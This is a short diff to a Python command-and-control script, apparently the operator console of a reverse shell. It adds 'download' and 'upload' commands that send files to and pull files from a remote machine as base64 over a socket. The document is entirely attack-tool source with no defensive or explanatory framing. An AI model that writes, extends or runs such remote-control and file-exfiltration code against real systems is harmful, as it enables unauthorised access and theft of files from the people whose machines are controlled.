@@ -2,6 +2,7 @@
 
 import sys
 import json
+import base64
 import socket
 from termcolor import colored
 
@@ -27,6 +28,16 @@ def shell():
             break
         elif command[:2] == "cd" and len(command) > 1:
             continue
+        elif command[:8] == "download":
+            with open(command[9:], "wb") as fout:
+                file_data = s_recv()
+                fout.write(base64.b64decode(file_data))
+        elif command[:6] == "upload":
+            try:
+                with open(command[7:], "rb") as fin:
+                    s_send(base64.b64encode(fin.read()))
+            except:
+                print(colored("Upload Failed !!!", "red"))
         else:
             result = s_recv()
             print(result)
